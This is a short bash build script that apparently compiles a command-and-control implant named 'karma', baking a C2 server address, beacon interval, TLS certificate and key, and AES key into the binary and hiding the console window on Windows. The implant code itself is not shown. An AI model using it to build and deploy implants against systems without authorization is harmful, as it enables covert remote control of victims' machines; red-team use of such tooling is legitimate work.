#!/bin/bash
set -e

GOOS=$1
GOARCH=$2
C2=$3
WAITSEC=$4
CERT=$5
KEY=$6
AESKEY=$7 # rest are base32 encoded
X1=$8 
X2=$9
UUID=${10}

LDFLAGS=(
    "-X 'main.InitC2Endpoint=${C2}'"
    "-X 'main.InitWaitSeconds=${WAITSEC}'"
    "-X 'main.InitUUID=${UUID}'"
    "-X 'main.certData=${CERT}'"
    "-X 'main.keyData=${KEY}'"
    "-X 'main.InitAESKey=${AESKEY}'"
    "-X 'main.X1=${X1}'"
    "-X 'main.X2=${X2}'"    
)

OLDDIR=$PWD
if [ "${GOOS}" == "windows" ]; then
    LDFLAGS+=("-H=windowsgui")
fi

cd $(dirname $0)
GOOS=${GOOS} GOARCH=${GOARCH} go build -ldflags="${LDFLAGS[*]}" .
mkdir -p $OLDDIR/bin
mv karma* $OLDDIR/bin
echo "'karma' saved to $OLDDIR/bin"